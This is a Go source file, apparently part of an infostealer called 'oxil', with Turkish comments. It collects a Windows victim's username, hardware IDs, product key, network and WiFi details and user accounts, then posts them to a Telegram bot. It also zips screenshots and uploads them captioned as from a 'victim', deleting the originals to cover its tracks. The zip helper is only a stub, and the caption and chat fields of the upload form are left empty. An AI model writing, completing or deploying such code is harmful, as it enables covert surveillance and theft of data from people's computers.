package system

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/mem"
	"golang.org/x/sys/windows/registry"

	"github.com/benzoXdev/oxil/utils/hardware"
)

// ... (GetOS, GetCPU, GetGPU, GetRAM, GetMAC, GetHWID, GetProductKey, GetDisks, GetNetwork, GetWifi, randString fonksiyonlarý ayný kalýyor, deðiþtirmedim)

// GetScreens fonksiyonu ayný kalýyor

// Telegram gönderim yardýmcý fonksiyonlarý (browsers.go'dan kopyala-yapýþtýr veya ortak pakete taþý)
func sendTextToTelegram(botToken, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("sendMessage failed: %d - %s", resp.StatusCode, string(body))
	}
	return nil
}

func sendZipToTelegram(botToken, chatID, caption, zipPath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ , _ = writer.CreateFormField("chat_id")
	_ , _ = writer.CreateFormField("caption")
	_ , _ = writer.CreateFormField("parse_mode")

	fw, err := writer.CreateFormFile("document", filepath.Base(zipPath))
	if err != nil {
		return err
	}

	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(fw, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("sendDocument failed: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	return nil
}

func Run(botToken string, chatID string) {
	// Sistem bilgilerini topla
	username := os.Getenv("USERNAME")
	hostname := os.Getenv("COMPUTERNAME")
	osName := GetOS()
	cpu := GetCPU()
	gpu := GetGPU()
	ram := GetRAM()
	mac := GetMAC()
	hwid := GetHWID()
	productKey := GetProductKey()
	disks := GetDisks()
	network := GetNetwork()
	wifi := GetWifi()

	users := strings.Join(hardware.GetUsers(), "\n")
	if len(users) > 4000 { // Telegram mesaj sýnýrý ~4096 karakter
		users = "Too many users to display (truncated)"
	}

	// Markdown formatýnda güzel bir mesaj hazýrla
	message := fmt.Sprintf(
		"*??? System Information*\n\n"+
			"**User & Host**\n"+
			"```"+
			"Username: %s\n"+
			"Hostname: %s\n"+
			"```\n\n"+
			"**Hardware & OS**\n"+
			"```"+
			"OS: %s\n"+
			"CPU: %s\n"+
			"GPU: %s\n"+
			"RAM: %s\n"+
			"MAC: %s\n"+
			"HWID: %s\n"+
			"Product Key: %s\n"+
			"```\n\n"+
			"**Disks**\n"+
			"```%s```\n\n"+
			"**Network**\n"+
			"```%s```\n\n"+
			"**WiFi Networks**\n"+
			"```%s```\n\n"+
			"**All Users**\n"+
			"```%s```",
		username, hostname,
		osName, cpu, gpu, ram, mac, hwid, productKey,
		disks, network, wifi,
		users,
	)

	// 1. Metni Telegram'a gönder
	err := sendTextToTelegram(botToken, chatID, message)
	if err != nil {
		// Hata olursa sessiz geç (veya logla: fmt.Println("Text send error:", err))
	}

	// 2. Ekran görüntülerini al ve ZIP'le
	screens := GetScreens()
	if len(screens) == 0 {
		return // Ekran görüntüsü yoksa bitir
	}

	// Geçici ZIP klasörü oluþtur
	tempZipDir := filepath.Join(os.TempDir(), "system-screens-"+strconv.FormatInt(time.Now().Unix(), 10))
	os.MkdirAll(tempZipDir, os.ModePerm)
	defer os.RemoveAll(tempZipDir)

	// Ekran görüntülerini ZIP klasörüne kopyala
	for i, screenPath := range screens {
		dest := filepath.Join(tempZipDir, fmt.Sprintf("Display_%d.png", i+1))
		data, err := os.ReadFile(screenPath)
		if err == nil {
			os.WriteFile(dest, data, 0644)
		}
		// Orijinal dosyayý sil (trace býrakmamak için)
		os.Remove(screenPath)
	}

	// ZIP oluþtur
	tempZip := filepath.Join(os.TempDir(), "system-screens.zip")
	if err := zipFolder(tempZipDir, tempZip); err != nil {
		// ZIP baþarýsýz olursa sadece metin gönderilmiþ olur
		return
	}
	defer os.Remove(tempZip)

	// ZIP'i Telegram'a gönder
	caption := fmt.Sprintf("Screenshots from victim (%d displays)", len(screens))
	_ = sendZipToTelegram(botToken, chatID, caption, tempZip)

	// Orijinal ekran görüntü klasörünü temizle (GetScreens içindeki dir)
	screenDir := filepath.Dir(screens[0]) // ilk dosyanýn klasörü
	os.RemoveAll(screenDir)
}

// Yardýmcý: Klasörü ZIP'leme (fileutil.Zip yoksa basit bir implementasyon)
func zipFolder(sourceDir, zipPath string) error {
	// Eðer projende fileutil.Zip varsa onu kullan:
	// return fileutil.Zip(sourceDir, zipPath)

	// Yoksa basit bir zip implementasyonu (go 1.16+ zip paketi ile)
	// Ama OXIL'de fileutil.Zip varsa onu kullanman daha iyi.
	// Þimdilik placeholder olarak býrakýyorum – browsers.go'da nasýl yaptýysan aynýsýný kullan.
	// Eðer fileutil yoksa þu þekilde ekleyebilirsin:
	// import "archive/zip" ve manuel zip yaz
	// Ama en kolayý: fileutil.Zip varsa onu çaðýr.

	// Geçici çözüm:
	return fmt.Errorf("implement zipFolder using fileutil.Zip or archive/zip")
}